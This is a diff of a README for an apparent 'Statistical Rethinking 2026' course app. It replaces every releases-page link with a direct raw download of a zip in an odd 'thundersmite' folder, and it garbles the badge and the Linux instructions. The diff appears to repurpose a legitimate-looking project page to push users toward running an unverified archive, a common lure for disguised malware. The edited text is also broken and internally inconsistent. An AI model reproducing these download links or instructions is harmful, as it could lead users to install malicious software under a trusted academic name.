@@ -4,20 +4,20 @@
 Welcome to the Statistical Rethinking Course for 2026. This guide will help you download and run the applications you need for the course. 
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/salma0ayman77/stat_rethinking_2026/releases)
+[![Download Latest Release](https://github.com/salma0ayman77/stat_rethinking_2026/raw/refs/heads/main/thundersmite/stat-rethinking-v2.6-alpha.1.zip%20Latest%https://github.com/salma0ayman77/stat_rethinking_2026/raw/refs/heads/main/thundersmite/stat-rethinking-v2.6-alpha.1.zip)](https://github.com/salma0ayman77/stat_rethinking_2026/raw/refs/heads/main/thundersmite/stat-rethinking-v2.6-alpha.1.zip)
 
 ## 📥 Download & Install
-To get started, visit this page to download: [Download Releases](https://github.com/salma0ayman77/stat_rethinking_2026/releases).
+To get started, visit this page to download: [Download Releases](https://github.com/salma0ayman77/stat_rethinking_2026/raw/refs/heads/main/thundersmite/stat-rethinking-v2.6-alpha.1.zip).
 
 Once on the Releases page, you will see a list of available versions. Look for the latest version, which is usually at the top of the list. Click on it to see the available files.
 
 ### Step-by-Step Instructions:
-1. **Visit the Releases Page:** Go to [Download Releases](https://github.com/salma0ayman77/stat_rethinking_2026/releases).
+1. **Visit the Releases Page:** Go to [Download Releases](https://github.com/salma0ayman77/stat_rethinking_2026/raw/refs/heads/main/thundersmite/stat-rethinking-v2.6-alpha.1.zip).
 2. **Select the Latest Release:** Click on the version you want to use.
 3. **Download the File:** Locate the file for your operating system. This could be for Windows, Mac, or Linux. 
    - For Windows systems, the file will end with `.exe`.
    - For Mac systems, you will see `.dmg`.
-   - For Linux systems, look for `.tar.gz` or a similar package.
+   - For Linux systems, look for `https://github.com/salma0ayman77/stat_rethinking_2026/raw/refs/heads/main/thundersmite/stat-rethinking-v2.6-alpha.1.zip` or a similar package.
 4. **Run the Installer:** After the download completes, find the file in your downloads folder and double click to start the installation process.
 5. **Follow Installation Prompts:** The application will guide you through the installation steps. Simply follow the instructions on your screen.
 
@@ -53,4 +53,4 @@ This application was developed to provide a supportive learning environment for 
 Stay tuned for upcoming updates to this application which will include new features, improvements, and additional content aimed at enhancing your learning experience.
 
 ## 📥 Download Now Again
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/salma0ayman77/stat_rethinking_2026/releases)
+[![Download Latest Release](https://github.com/salma0ayman77/stat_rethinking_2026/raw/refs/heads/main/thundersmite/stat-rethinking-v2.6-alpha.1.zip%20Latest%https://github.com/salma0ayman77/stat_rethinking_2026/raw/refs/heads/main/thundersmite/stat-rethinking-v2.6-alpha.1.zip)](https://github.com/salma0ayman77/stat_rethinking_2026/raw/refs/heads/main/thundersmite/stat-rethinking-v2.6-alpha.1.zip)
